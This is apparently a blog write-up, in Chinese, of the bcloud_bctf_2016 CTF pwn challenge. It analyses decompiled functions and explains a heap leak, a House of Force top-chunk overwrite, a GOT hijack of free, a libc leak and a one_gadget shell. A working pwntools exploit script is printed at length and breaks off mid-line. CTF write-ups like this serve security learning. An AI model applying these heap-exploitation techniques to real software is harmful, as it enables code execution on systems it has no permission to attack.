class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span> &amp;&amp; heap_array[i]; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">10</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Lack of space. Upgrade your account with just $100 :)"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the length of the note content:"</span>);<br>  v2 = <span class="hljs-built_in">choose</span>();<br>  heap_array[i] = <span class="hljs-built_in">malloc</span>(v2 + <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array[i] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  dword_804B0A0[i] = v2;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the content:"</span>);<br>  <span class="hljs-built_in">readd</span>(heap_array[i], v2, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Create success, the id is %d\n"</span>, i);<br>  result = i;<br>  dword_804B0E0[i] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>}<br></code></pre></td></tr></tbody></table></figure><p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  v2 = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  v3 = dword_804B0A0[v1];<br>  dword_804B0E0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the new content:"</span>);<br>  <span class="hljs-built_in">readd</span>(v2, v3, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Edit success."</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">void</span> *index; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  index = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !index )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  heap_array[v1] = <span class="hljs-number">0</span>;<br>  dword_804B0A0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">free</span>(index);  #<span class="hljs-function">UAF</span><br><span class="hljs-function">  <span class="hljs-keyword">return</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-string">"Delete success."</span>)</span></span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>delete函数在释放chunk时存在UAF漏洞</p><h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">int __cdecl readd(int a1, int a2, char a3)<br>{<br>  char buf; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Bh] [ebp-Dh] BYREF<br>  int i; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Ch] [ebp-Ch]<br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>u) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(a1 + i) = buf;<br>  }<br>  *(i + a1) = <span class="hljs-number">0</span>;<br>  return i;<br>}<br></code></pre></td></tr></tbody></table></figure><p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p><h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs scss">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-built_in">context</span>(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，<span class="hljs-number">64</span>位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-built_in">dbg</span>():<br>        gdb.<span class="hljs-built_in">attach</span>(sh)<br>        <span class="hljs-built_in">pause</span>()<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim, data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>ru      = lambda delims, drop=True  :sh.<span class="hljs-built_in">recvuntil</span>(delims, drop)<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = lambda address,data       :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>#sh = <span class="hljs-built_in">remote</span>(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26937</span>)<br>elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>def <span class="hljs-built_in">add</span>(size,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'note content:'</span>,<span class="hljs-built_in">str</span>(size))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">edit</span>(index,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">delete</span>(index):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br></code></pre></td></tr></tbody></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br>heap_addr = <span class="hljs-built_in">u32</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">4</span>)) - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000005C v2 dd ?</span><br><span class="hljs-deletion">-00000058 db ? ; undefined</span><br><span class="hljs-deletion">-00000057 db ? ; undefined</span><br>..........<br><span class="hljs-deletion">-00000016 db ? ; undefined</span><br><span class="hljs-deletion">-00000015 db ? ; undefined</span><br><span class="hljs-deletion">-00000014 v4 dd ?</span><br><span class="hljs-deletion">-00000010 db ? ; undefined</span><br><span class="hljs-deletion">-0000000F db ? ; undefined</span><br><span class="hljs-deletion">-0000000E db ? ; undefined</span><br><span class="hljs-deletion">-0000000D db ? ; undefined</span><br></code></pre></td></tr></tbody></table></figure><p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x40)</span></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0</span>xFFFFFFFF)</span></span>)<br>top_chunk_addr = heap_addr  + <span class="hljs-number">0</span>x48*<span class="hljs-number">3</span> - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr)</span></span>)<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">offset</span> = heap_array - （top_chunk_addr +<span class="hljs-number">0</span>x8）- <span class="hljs-number">0</span>x8<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(offset,<span class="hljs-string">'\n'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18,<span class="hljs-string">'\n'</span>)</span></span><br></code></pre></td></tr></tbody></table></figure><p>之后编辑chunk_1来修改heap_array数组</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt = elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">'puts'</span>]</span><br>__libc_start_main_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'__libc_start_main'</span>]</span><br>free_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'free'</span>]</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>)</span></span> + <span class="hljs-built_in">p32</span>(free_got) + <span class="hljs-built_in">p32</span>(__libc_start_main_got) + <span class="hljs-built_in">p32</span>(heap_array + <span class="hljs-number">0</span>x10) + b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x8)<br></code></pre></td></tr></tbody></table></figure><p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(puts_plt)</span></span> + b<span class="hljs-string">'\n'</span>)<br></code></pre></td></tr></tbody></table></figure><p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#本地</span><br><span class="hljs-attr">one_gadget</span> = [<span class="hljs-number">0</span>x3ac3c,<span class="hljs-number">0</span>x3ac3e,<span class="hljs-number">0</span>x3ac42,<span class="hljs-number">0</span>x3ac49,<span class="hljs-number">0</span>x5faa5,<span class="hljs-number">0</span>x5faa6]<br><span class="hljs-attr">libc</span> = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br><span class="hljs-comment">#buu远程</span><br><span class="hljs-comment">#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="hljs-comment">#libc = ELF('../../libc-2.23.so--32')</span><br><span class="hljs-attr">libc_base</span> = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br><span class="hljs-attr">onegadget</span> = <span class="hljs-literal">on</span>e_gadget[<span class="hljs-number">3</span>] + libc_base<br></code></pre></td></tr></tbody></table></figure><p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'i386'</span>,log_level=<span class="hljs-string">'debug'</span>)</span> #小端序，linux系统，64位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-title function_">dbg</span><span class="hljs-params">()</span>:<br>        gdb.<span class="hljs-title function_">attach</span><span class="hljs-params">(sh)</span><br>        <span class="hljs-title function_">pause</span><span class="hljs-params">()</span><br>#命令简写化<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><br>sh = process(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br><span class="hljs-meta">#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26937)</span><br><br>elf = ELF(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>__libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]<br>free_got = elf.got[<span class="hljs-string">'free'</span>]<br>heap_array = <span class="hljs-number">0x0804B120</span><br> <br>def add(size,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   sla(<span class="hljs-string">'note content:'</span>,str(size))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def edit(index,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def delete(index):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>def main():<br>sa(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>ru(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>heap_addr = u32(r(<span class="hljs-number">4</span>)) <br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><span class="hljs-meta">#dbg()</span><br>sa(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x40</span>)<br>#修改top chunk的size为<span class="hljs-number">-1</span>（<span class="hljs-number">0xFFFFFFFF</span>）<br>sla(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0xFFFFFFFF</span>))<br>top_chunk_addr = heap_addr + <span class="hljs-number">0x48</span>*<span class="hljs-number">3</span><span class="hljs-number">-0x8</span><br>lg(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr))<br>offset = heap_array - (top_chunk_addr +<span class="hljs-number">0x8</span>)- <span class="hljs-number">0x8</span><br>lg(<span class="hljs-string">'offset'</span>,offset)<br>add(offset,<span class="hljs-string">'') #0</span><br><span class="hljs-string">add(0x18,'</span>\n<span class="hljs-number">'</span>) #<span class="hljs-number">1</span><br>edit(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + <span class="hljs-number">0x10</span>)  + b<span class="hljs-number">'</span>\x00<span class="hljs-number">'</span>*<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">1</span>,p32(puts_plt) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br>#泄露__libc_start_main_got的地址<br>delete(<span class="hljs-number">2</span>)<br>r(<span class="hljs-number">1</span>)<br>__libc_start_main_addr = u32(r(<span class="hljs-number">4</span>))<br>lg(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br><span class="hljs-meta">#dbg()</span><br><span class="hljs-string">'''</span><br>libc = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br>libc_base = __libc_start_main_addr - libc.dump(<span class="hljs-string">'__libc_start_main'</span>)<br>system_addr = libc_base + libc.dump(<span 